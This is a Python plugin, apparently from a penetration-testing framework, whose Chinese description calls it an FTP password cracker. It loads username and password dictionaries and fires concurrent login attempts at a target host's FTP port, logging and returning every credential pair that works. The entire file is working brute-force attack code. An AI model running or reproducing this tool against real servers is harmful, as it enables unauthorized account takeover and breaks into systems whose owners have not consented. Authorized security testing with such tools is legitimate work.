# -*-* coding:UTF-8
import os
from ftplib import FTP


class Plugin(Base):
    __info__ = {
        "author": "doimet",
        "references": ["-"],
        "description": "ftp服务口令破解",
        "datetime": "2022-01-02"
    }

    @cli.options('port', desc="设置爆破端口", default=21)
    @cli.options('method', desc="设置口令爆破的模式,1:单点模式;2:交叉模式", default=1)
    @cli.options('username', desc="用户账号或字典文件", default=os.path.join('data', 'ftp_username.dict'))
    @cli.options('password', desc="用户密码或字典文件", default=os.path.join('data', 'ftp_password.dict'))
    @cli.options('timeout', desc="设置连接超时时间", default=5)
    def ip(self, port, method, username, password, timeout) -> dict:
        with self.async_pool(max_workers=self.target.setting.asyncio, threshold=self.threshold) as execute:
            for u, p in self.build_login_dict(
                    method=method,
                    username=username,
                    password=password,
            ):
                execute.submit(self.task, port, u, p, timeout)
            return {'LoginInfo': execute.result()}

    async def task(self, port, username, password, timeout):
        self.log.debug(f'Login => username: {username}, password: {password}')
        ftp = FTP()
        ftp.connect(self.target.value, port, timeout=timeout)
        ftp.login(user=username, passwd=password)
        ftp.close()
        self.log.info(f'Login => username: {username}, password: {password} [success]')
        return {
            'port': port,
            'server': 'ftp',
            'username': username,
            'password': password
        }
